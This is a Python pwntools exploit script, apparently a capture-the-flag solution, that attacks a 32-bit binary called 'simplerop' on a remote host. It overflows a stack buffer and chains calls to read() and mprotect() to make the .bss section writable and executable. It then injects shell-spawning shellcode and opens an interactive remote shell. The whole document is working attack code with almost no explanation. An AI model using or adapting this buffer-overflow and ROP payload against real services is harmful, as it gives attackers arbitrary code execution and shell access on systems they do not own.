from pwn import *

p = remote("realsung.kr", 13356)
# p = process("./simplerop")
e = ELF("./simplerop")
context.log_level = 'debug'
context.clear(arch='i386', os='linux')

pop3ret = 0x0804838C
bss = 0x080EC000

# %eax %ebx %ecx %edx
pl = b''
pl += b'A' * 0x1c + b'B' * 0x4

pl += p32(e.symbols['read']) + p32(pop3ret) + p32(0) + p32(bss) + p32(0x100)
pl += p32(e.symbols['mprotect']) + p32(pop3ret) + p32(bss) + p32(0x100) + p32(7)
pl += p32(bss)

pause()
p.sendlineafter(b":", pl)

shellcode = asm(shellcraft.sh())

pause()
p.sendline(shellcode)

p.interactive()